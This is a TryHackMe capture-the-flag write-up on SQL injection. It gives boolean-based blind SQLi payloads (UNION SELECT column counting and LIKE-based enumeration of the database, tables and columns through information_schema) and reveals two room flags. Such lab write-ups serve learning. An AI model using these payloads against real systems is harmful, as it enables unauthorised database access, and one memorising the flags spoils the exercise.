<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/sql_injection/SQLI_Cover.png" alt="SQL Injection Cover">
</p>

# SQL Injection

## Table of Contents

- [In-Band SQLi](#in-band-sqli)
- [Blind SQLi - Authentication Bypass](#blind-sqli---authentication-bypass)
- [Blind SQLi - Boolean Based](#blind-sqli---boolean-based)
- [Blind SQLi - Time Based](#blind-sqli---time-Based)

## In-Band SQLi

1. What is the flag after completing level 1?



   ><details><summary>Click for answer</summary></details>

## Blind SQLi - Authentication Bypass

1. What is the flag after completing level two? (and moving to level 3)

   

   ><details><summary>Click for answer</summary>THM{SQL_INJECTION_9581}</details>

## Blind SQLi - Boolean Based

1. What is the flag after completing level three?

   On level 3 we only get a true or false response to help us find the answer.
   
   We first need to find the number of columns using:
   
   ```cmd
   ' UNION SELECT 1,2,3;--
   
   Add as many columns as needed for the response to become true
   ```
   
   To enumerate the database names, we can use the following method:
   
   ```cmd
   ' UNION SELECT 1,2,3 WHERE database() LIKE '%';--
   
   Try combinations before the % until we find a name
   'sqli_three' this time
   ```
   
   To enumerate the table names within the database we use the following method:
   
   ```cmd
   ' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema="sqli_three" AND table_name LIKE '%';--
   
   Try combinations before the % until we find a name
   'users' this time
   ```
   
   To enumerate the columns within this table we use the following method:
   
   ```cmd
   ' UNION SELECT 1,2,3 FROM information_schema.columns WHERE table_schema="sqli_three" AND table_name="users" AND column_name LIKE '%';--
   
   Try combinations before the % until we find a name.
   
   Then add it as 'column_name!=...' to make sure we don't get a hit on it again
   
   `id`, `username`, and `password` we get this time.
   ```
   
   Next we need to find any existing username.

   ![SQLi Boolean](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/sql_injection/SQLI_Boolean_Based_Found.png)

   ><details><summary>Click for answer</summary>THM{SQL_INJECTION_1093}</details>

## Blind SQLi - Time Based

1. What is the final flag after completing level four?

   ><details><summary>Click for answer</summary></details>
